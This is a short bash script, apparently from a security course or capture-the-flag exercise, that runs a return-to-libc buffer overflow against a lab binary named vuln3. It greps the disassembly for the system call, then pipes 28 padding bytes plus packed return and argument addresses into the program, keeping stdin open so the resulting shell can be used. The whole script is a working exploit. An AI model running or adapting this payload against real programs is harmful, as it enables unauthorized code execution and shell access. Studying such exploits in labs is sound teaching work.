#!/bin/bash

echo "objdump -d vuln3 | grep -C1 system"
objdump -d vuln3 | grep -C1 system
echo "(python2 -c 'import struct; v_ret=0x08048390; f1_ret=0x41414141; f1_parm=0x8048600; print "A"*28 + struct.pack("III", v_ret, f1_ret, f1_parm)'; cat -) | ./vuln3"
(python2 -c 'import struct; v_ret=0x08048390; f1_ret=0x41414141; f1_parm=0x8048600; print "A"*28 + struct.pack("III", v_ret, f1_ret, f1_parm)'; cat -) | ./vuln3
